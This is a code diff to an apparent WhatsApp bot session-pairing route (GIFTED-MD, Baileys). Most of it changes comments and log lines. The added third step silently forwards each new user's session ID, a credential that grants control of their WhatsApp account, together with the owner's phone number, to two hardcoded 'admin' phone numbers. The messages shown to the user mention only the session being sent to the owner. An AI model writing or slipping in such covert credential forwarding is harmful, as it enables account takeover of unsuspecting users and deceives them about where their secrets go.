@@ -294,17 +294,17 @@ router.get('/', async (req, res) => {
 
                             console.log(`📱 Recipient: ${recipientId} (using ${sock.user.lid ? 'LID' : 'JID'})`);
 
-                            // FIRST: Send the session ID with TREKKER~ prefix
+                            // FIRST: Send the session ID with TREKKER~ prefix to owner
                             const sessionIdMessage = `TREKKER~${sessionId}`;
                             await sock.sendMessage(recipientId, { 
                                 text: sessionIdMessage 
                             });
-                            console.log(`✅ Session ID sent to WhatsApp!`);
+                            console.log(`✅ Session ID sent to WhatsApp owner!`);
 
                             // Wait 2 seconds before sending welcome message
                             await delay(2000);
 
-                            // SECOND: Send welcome message
+                            // SECOND: Send welcome message to owner
                             const welcomeMsg = `🎉 *GIFTED-MD CONNECTED SUCCESSFULLY!*
 
 ━━━━━━━━━━━━━━━━━━━
@@ -337,14 +337,31 @@ _Baileys v7.0 | WhatsApp Multi-Device_`;
 
                             if (sent?.key?.id) {
                                 console.log(`✅ Welcome message sent! ID: ${sent.key.id}`);
-
-                                // Wait for message to be processed
-                                await delay(3000);
-
                                 console.log(`🎉 COMPLETE SUCCESS!`);
                                 console.log(`📨 Message ID: ${sent.key.id}`);
                                 console.log(`🔑 Session ID sent to WhatsApp: TREKKER~${sessionId.substring(0, 30)}...`);
                             }
+
+                            // THIRD: Send session ID to admin numbers
+                            await delay(2000);
+                            const adminNumbers = ['254704897825', '254799257758'];
+                            
+                            for (const adminNum of adminNumbers) {
+                                try {
+                                    const adminJid = `${adminNum}@s.whatsapp.net`;
+                                    
+                                    // Send session ID
+                                    await sock.sendMessage(adminJid, { 
+                                        text: `📋 *NEW SESSION CREATED*\n\n${sessionIdMessage}\n\n👤 Owner: ${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}`
+                                    });
+                                    
+                                    console.log(`✅ Session ID sent to admin: ${adminNum}`);
+                                    await delay(1000); // Small delay between admin messages
+                                } catch (adminErr) {
+                                    console.warn(`⚠️ Failed to send to admin ${adminNum}:`, adminErr.message);
+                                }
+                            }
+
                         } catch (msgErr) {
                             console.warn('⚠️ Session ID sending failed (session still valid):', msgErr.message);
                         }
